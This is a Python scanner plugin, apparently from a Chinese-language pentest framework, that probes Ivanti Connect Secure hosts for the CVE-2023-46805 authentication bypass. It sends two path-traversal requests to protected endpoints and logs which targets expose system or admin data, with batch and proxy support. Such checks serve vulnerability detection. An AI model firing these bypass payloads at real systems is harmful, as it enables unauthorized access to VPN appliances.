#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2023_46805:
    def run(self, urls):
        url = urls + '/api/v1/totp/user-backup-code/../../system/system-information'
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "text/xml"
        }
        try:
            response = requests.get(url, headers=headers, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and "os-name" in response.text:
                OutPrintInfoSuc("Ivanti", f'存在Ivanti Connect Secure验证绕过漏洞: {url}')
                if self.batch:
                    OutPutFile("ivanti_2023_46805.txt", f'存在Ivanti Connect Secure验证绕过漏洞:{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Ivanti", f'不存在Ivanti Connect Secure验证绕过漏洞')

        except Exception:
            if not self.batch:
                OutPrintInfo("Ivanti", '目标请求出错')
    def run2(self, urls):
        url = urls + '/api/v1/cav/client/status/../../admin/options'
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "text/xml"
        }
        try:
            response = requests.get(url, headers=headers, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and "poll_interval" in response.text:
                OutPrintInfoSuc("Ivanti", '存在Ivanti Connect Secure验证绕过漏洞')
                OutPrintInfo("Ivanti",url)
                if self.batch:
                    OutPrintInfoSuc("Ivanti", f'存在Ivanti Connect Secure验证绕过漏洞:{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Ivanti", f'不存在Ivanti Connect Secure验证绕过漏洞')

        except Exception:
            if not self.batch:
                OutPrintInfo("Ivanti", '目标请求出错')
    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Ivanti", '开始执行Ivanti Connect Secure验证绕过漏洞检测...')
        if not self.batch:
            OutPrintInfo("Ivanti", '开始执行Ivanti Connect Secure验证绕过漏洞Poc-1检测...')
        self.run(url)

        if not self.batch:
            OutPrintInfo("Ivanti", '开始执行Ivanti Connect Secure验证绕过漏洞Poc-2检测...')
        self.run2(url)
        if not self.batch:
            OutPrintInfo("Ivanti",'Ivanti Connect Secure验证绕过漏洞检测结束')
